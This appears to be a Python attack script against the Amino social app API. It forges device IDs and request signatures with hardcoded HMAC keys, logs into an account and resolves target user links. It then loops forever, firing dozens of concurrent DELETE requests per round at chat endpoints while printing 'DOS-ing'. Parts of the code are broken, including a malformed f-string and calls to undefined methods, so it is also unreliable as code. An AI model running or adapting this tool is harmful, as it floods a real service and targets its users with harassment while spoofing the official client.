from concurrent.futures import ThreadPoolExecutor

from weakref import proxy

from requests import get

from hashlib import sha1

import os

from os import path

import json, time

import aiohttp

import asyncio

import base64

import hmac

import sys

import requests

from hashlib import sha1

import names

import random

import sys

import hmac

import platform,socket,re,uuid

import ssl

from os import path

from functools import wraps

import subprocess

def ree():

    subprocess.call(['python', 'app.py'])

    sys.exit()

chatId=""

com=""

def dev():

    hw=(names.get_full_name()+str(random.randint(0,10000000))+platform.version()+platform.machine()+names.get_first_name()+socket.gethostbyname(socket.gethostname())+':'.join(re.findall('..', '%012x' % uuid.getnode()))+platform.processor())

    identifier=sha1(hw.encode('utf-8')).digest()

    mac = hmac.new(bytes.fromhex('AE49550458D8E7C51D566916B04888BFB8B3CA7D'), b"\x52" + identifier, sha1)

    return (f"52{identifier.hex()}{mac.hexdigest()}").upper()

def agent():

    s = requests.Session()

    return s.headers['User-Agent']

class FromLink:

    def __init__(self, data):

        self.json = data

        self.objectType = None

        self.objectId = None

        self.comId = None

    @property

    def FromCode(self):

        try:

            self.path = self.json["path"]

        except (KeyError, TypeError):

            pass

        try:

            self.objectType = self.json["extensions"]["linkInfo"]["objectType"]

        except (KeyError, TypeError):

            pass

        try:

            self.objectId = self.json["extensions"]["linkInfo"]["objectId"]

        except (KeyError, TypeError):

            pass

        try:

            self.comId = self.json["extensions"]["community"]["ndcId"]

        except (KeyError, TypeError):

            try:

                self.comId = self.json["extensions"]["linkInfo"]["ndcId"]

            except (KeyError, TypeError):

                pass

        return self

class Account():

    def __init__(self,email, password ,session):

        self.authenticated = False

        self.email = email

        self.password = password

        self.device_id = dev()

        self.session = session

        self.target_user = []

        self.hostgc = None

        self.cid = None

        self.sid= None

        self.uid = None

        self.api = 'https://service.narvii.com/api/v1'

        self.hostgc=None

    async def generate_headers(self, data=None, content_type=None, sig=None):

        headers = {

            'NDCDEVICEID': dev(),

            'Accept-Language': 'en-US',

            'Content-Type': 'application/json; charset=utf-8',

            'User-Agent':"Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QQ3A.200805.001; com.narvii.amino.master/3.4.33585)",

            'Host': 'service.narvii.com',

            'Accept-Encoding': 'gzip',

            'Connection': 'Keep-Alive'

        }

        if data:

            headers['Content-Length'] = str(len(data))

            if sig:

                headers['NDC-MSG-SIG'] = sig

        if self.sid:

            headers['NDCAUTH'] = f'sid={self.sid}'

        if content_type:

            headers["Content-Type"] = content_type

        return headers

    async def sig(self, data):

        signature = base64.b64encode(

            bytes.fromhex("52") +

            hmac.new(bytes.fromhex("EAB4F1B9E3340CD1631EDE3B587CC3EBEDF1AFA9"),

                     data.encode("utf-8"), sha1).digest()).decode("utf-8")

        return signature

    async def login(self):

        data = json.dumps({

            'email': self.email,

            'v': 2,

            'secret': f'{self.password}',

            'deviceID': self.device_id,

            'clientType': 100,

            'action': 'normal',

            'timestamp': int(time.time() * 1000)

        })

        async with self.session.post(f'{self.api}/g/s/auth/login',

                                     headers=await

                                     self.generate_headers(data=data,

                                                           sig=await

                                                           self.sig(data)),

                                     data=data) as response:

            

            	

            if response.status== 200:

	            respons = await response.json()

	            if respons["api:statuscode"] == 0:

	                print("using requests")

	                self.sid = respons["sid"]

	                

	                self.uid = respons["account"]["uid"]

	                self.authenticated = True

	                #pass

	            else:

                    

	                print(response.text)

	            

            else:

                

            	print(response.status)

   

    

    async def from_link(self, lol,link):

        response = get(f"{self.api}/g/s/link-resolution?q={link}",

                       headers=await self.generate_headers())

        if response.status_code== 200:

            resp=response.json()

            if resp["api:statuscode"] == 0:

                pass

            else:

                print(f'link: {resp["api:statuscode"]}')

                #restart()

                #sys.exit()

        else:

            print(f"error code {response.status_code}")

            #restart()

            #sys.exit()

        x = FromLink(resp["linkInfoV2"]).FromCode

        if lol=="many":

            self.cid = x.comId

            print(self.cid)

            self.hostgc = x.objectId

            print(self.hostgc)

        if lol=="online":

        	self.cid = x.comId

        	print(self.cid)

        if lol=="user":

            self.target_user.append(x.objectId)

            #print(self.target_user.append)

            

    

    	

    async def dele(self,uid):

        async with self.session.delete(

                f"{self.api}/x{com}/s/chat/thread/{chatId{/co-host/{uid}",

                headers=await self.generate_headers()) as l:

                if l.status == 200:

                    response = await l.json()

                    if response["api:message"]=="OK":

                        pass

                    else:

                        print(response)

   

    async def crash(self, uid):

        try:

          #await self.setx(uid)

          await self.dele(uid)

          

          print(f"DOS-ing... {uid}")

        except Exception as e:

            ree()

            print(f"errghhhhor {e}")

   

async def itachi(acc: Account,lol:str):

    crowd = []

    xo = len(acc.target_user)

    # for _ in range(10):

    if lol=="online":

    	with ThreadPoolExecutor(max_workers=70) as exe:

	        _ = [

	            exe.submit(

	                crowd.append(

	                    asyncio.create_task(acc.crash(acc.target_user[i % xo]))))

	            for i in range(20)

	        ]

	        await asyncio.gather(*crowd)

    else:

	    with ThreadPoolExecutor(max_workers=100) as exe:

	        _ = [

	            exe.submit(

	                crowd.append(

	                    asyncio.create_task(acc.crash(acc.target_user[i % xo]))))

	            for i in range(60)

	        ]

	    await asyncio.gather(*crowd)

async def main(email, password,link,lol):

    

    async with aiohttp.ClientSession() as session:

        

        

        client = Account(email, password,session)

        await client.login()

        

        total=[]

        if lol=="online":

        	await client.from_link(lol,link)

        	await client.get_online_users(size=100)

        

        if lol =="user":

        	print(link)

        	for yo in link:

	            total.append(asyncio.create_task(client.from_link(lol,yo)))

	        await asyncio.gather(*total)

        if lol=="many":

        	await client.from_link(lol,link)

        	await client.chat_admin()

        

        while True:

            await itachi(client,lol)

            

def run(email, password,link,lol):

  asyncio.get_event_loop().run_until_complete(main(email, password,link,lol))

def runn():    

    email="aaaaaafg"

    secret=""

    link=["http://aminoapps.com/p/dz1ngb"]

    lol="user"

    run(email,secret,link,lol)

    #restart()2s3zpr

runn()